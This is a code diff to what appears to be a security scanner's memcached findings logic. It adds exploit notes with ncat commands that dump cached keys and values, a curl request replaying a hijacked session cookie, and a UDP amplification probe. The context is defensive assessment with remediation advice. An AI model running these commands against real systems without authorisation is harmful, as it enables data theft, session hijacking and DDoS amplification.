@@ -469,7 +469,11 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"printf 'stats\\r\\nstats items\\r\\n' | ncat {h.ip} {p.portid}   "
                     f"# then: stats cachedump <slab> <n> ; get <key>",
                     "Bind to localhost, enable SASL (-S), disable UDP (-U 0), firewall 11211.",
-                    ["CWE-306", "CWE-284"], kind="memcached_unauth"))
+                    ["CWE-306", "CWE-284"], kind="memcached_unauth",
+                    exploit_note=(
+                        "printf 'stats\\r\\nstats items\\r\\nstats cachedump 1 200"
+                        "\\r\\n' | ncat <ip> <port>"),
+                    depth_tier="t2"))
             if ver and _old_version(ver):
                 out.append(_finding(
                     "medium", "memcached end-of-life / legacy build", tgt,
@@ -499,7 +503,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"printf 'get <key>\\r\\n' | ncat {h.ip} {p.portid}   "
                     f"# after: stats cachedump <slab> <n>",
                     "Bind to localhost, enable SASL (-S), firewall the port.",
-                    ["CWE-200", "CWE-522"], kind="memcached_values_readable"))
+                    ["CWE-200", "CWE-522"], kind="memcached_values_readable",
+                    exploit_note=(
+                        "printf 'get <sensitive-key>\\r\\n' | ncat <ip> <port> ; "
+                        "then curl -H 'Cookie: SESSIONID=<hijacked>' "
+                        "https://<paired-app>/ to prove the hijack."),
+                    depth_tier="t2"))
             # UDP amplification-vector confirmation - only fires when we actually
             # got a datagram back (never on inference).
             udp = pr.get("udp") or {}
@@ -518,7 +527,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f" | ncat -u {h.ip} {p.portid}",
                     "Disable UDP with `-U 0` (memcached >= 1.5.6 default) and firewall "
                     "UDP 11211 at the edge.",
-                    ["CWE-406", "CWE-405"], kind="memcached_udp_amplification"))
+                    ["CWE-406", "CWE-405"], kind="memcached_udp_amplification",
+                    exploit_note=(
+                        "printf '\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00stats"
+                        "\\r\\n' | ncat -u <ip> <port> - measure reply size vs "
+                        "request size."),
+                    depth_tier="t1"))
     return out
 
 
